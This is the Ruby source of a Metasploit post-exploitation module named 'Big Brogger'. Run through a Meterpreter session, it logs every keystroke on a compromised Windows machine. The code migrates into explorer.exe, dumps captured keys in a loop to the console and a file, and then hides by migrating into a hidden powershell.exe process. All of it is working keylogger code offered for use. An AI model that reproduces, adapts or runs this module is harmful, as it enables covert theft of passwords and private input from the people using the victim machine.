##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Big Brogger',
        'Description' => %q{ Post module to capture all keyboard inputs on a Windows system. },
        'License' => MSF_LICENSE,
        'Author' => ['Tom Dejardin', 'Yohan Bordes'],
        'Platform' => ['windows'],
        'SessionTypes' => ['meterpreter']
      )
    )
	register_options([
		OptString.new('outputfile', [true, 'Fichier d\'enregistrement des touches'])
	])
  end

  def run
    # Trap SIGINT (Ctrl+C) signal
    trap('INT') { cleanup_and_exit }

    print_status('Migrating to explorer.exe...')

    begin
      # Retrieve the process list
      process_list = client.sys.process.get_processes

      # Find the PID of the explorer.exe process
      explorer_pid = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i } ['pid']

      # Migrate to explorer.exe process
      client.core.migrate(explorer_pid)
      print_good('Successfully migrated to explorer.exe.')
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to migrate to explorer.exe: #{e.message}. Exiting...")
      return
    end

    print_status('Keylogger started...')
	output_file = datastore['outputfile']
	output_handle = nil
	
	if output_file.present?
      print_status("Captured keystrokes will be saved to #{output_file}.")
      output_handle = File.open(output_file, 'a')
    end

    # Start the keyscan capture
    client.ui.keyscan_start

    begin
      loop do
        # Retrieve captured keystrokes
        captured_keys = client.ui.keyscan_dump

        # Print the captured keys
        if captured_keys.present? then
          print_status("Captured keys: #{captured_keys}")
		  output_handle.puts(captured_keys) if output_handle != nil
        else
          # Sleep for a short duration to avoid high CPU usage
          sleep(1)
        end
      end
    rescue Rex::ConnectionError
      print_status('Connection error occurred. Exiting keylogger.')
    rescue Rex::RuntimeError => e
      print_error("Error occurred: #{e.message}")
    ensure
      cleanup_and_exit(output_handle)
    end
  end

  def cleanup_and_exit(output_handle = nil)
    begin
      # Stop the keyscan capture
      client.ui.keyscan_stop
      print_status('Keylogger stopped.')
	  
	  output_handle.close() if output_handle && !output_handle.closed?

      # Retrieve the process list
      process_list = client.sys.process.get_processes

      # Find the PID of the powershell.exe process
      powershell_proc = process_list.find { |proc| proc['name'] =~ /powershell\.exe/i }
      powershell_pid = powershell_proc ? powershell_proc['pid'] : nil

      if powershell_pid.nil?
        # Create a new powershell.exe process
        print_status('Creating new powershell.exe process...')
        powershell_proc = client.sys.process.execute('powershell.exe', nil, {
          'Hidden' => true,
          'Channelized' => true
        })
        powershell_pid = powershell_proc.pid
        print_good("Successfully created powershell.exe process with PID #{powershell_pid}.")

        # Migrate to the new powershell.exe process
        print_status('Migrating to new powershell.exe process...')
        client.core.migrate(powershell_pid)
        print_good('Successfully migrated to new powershell.exe process.')
      else

        # Migrate to the existing powershell.exe process
        print_good("Found existing powershell.exe process with PID #{powershell_pid}")
        print_status('Migrating to existing powershell.exe process...')
        client.core.migrate(powershell_pid)
        print_good('Successfully migrated to existing powershell.exe process.')
      end
    ensure
      exit
    end
  end
end
